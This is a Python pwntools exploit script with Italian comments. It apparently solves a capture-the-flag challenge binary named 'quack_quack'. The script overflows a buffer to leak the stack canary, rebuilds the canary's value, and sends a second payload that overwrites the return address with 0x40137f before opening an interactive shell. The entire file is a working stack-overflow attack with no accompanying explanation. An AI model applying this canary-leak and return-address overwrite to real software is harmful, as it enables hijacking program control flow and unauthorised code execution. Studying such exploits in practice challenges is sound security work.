#!/usr/bin/env python3

from pwn import *
import re

# Configurazione del contesto
context.binary = './quack_quack'
context.log_level = 'info'

# Avvio del processo
p = process(context.binary.path)

# Attendi output iniziale
timeout_val = 2
output = p.recv(timeout=timeout_val)

# Costruzione del payload
offset_buffer = b'A' * 89
payload_leak = offset_buffer + b'Quack Quack '  # Trigger per strstr

# Invia payload per il leak del canary
p.sendline(payload_leak)

# Ricevi l'output dopo l'invio del payload
output = p.recv(timeout=timeout_val)
log.info(f"Raw output ricevuto: {output}")

# Troviamo la parte che inizia con "Quack Quack " e termina con ", ready"
match = re.search(rb"Quack Quack (.*?), ready", output)
if match:
    # Estrai i byte dal leak
    leaked_bytes = match.group(1)
    
    # Debug: stampa i byte in esadecimale
    log.info(f"Bytes leaked (hex): {leaked_bytes.hex()}")
    log.info(f"Lunghezza bytes: {len(leaked_bytes)}")
    
    # Isoliamo i 7 byte del canary (sapendo che il primo byte è 0)
    canary_bytes = leaked_bytes[:7]
    
    # Ricostruiamo il valore intero del canary
    canary_value = u64(b'\x00' + canary_bytes)
    
    log.success(f"Canary bytes leakati: {canary_bytes.hex()}")
    log.success(f"Canary ricostruito: 0x{canary_value:016x}")
else:
    log.error("Pattern non trovato!")
    exit(1)

# Costruzione del payload finale per lo sfruttamento della vulnerabilità
payload_finale = b'A' * 88      # Padding fino al canary
payload_finale += p64(canary_value)  # Inseriamo il canary ricostruito
payload_finale += b'B' * 8      # Padding per saved rbp
payload_finale += p64(0x40137f) # Indirizzo di ritorno controllato

# Invia il payload finale
p.sendline(payload_finale)

# Interazione con la shell
p.interactive()
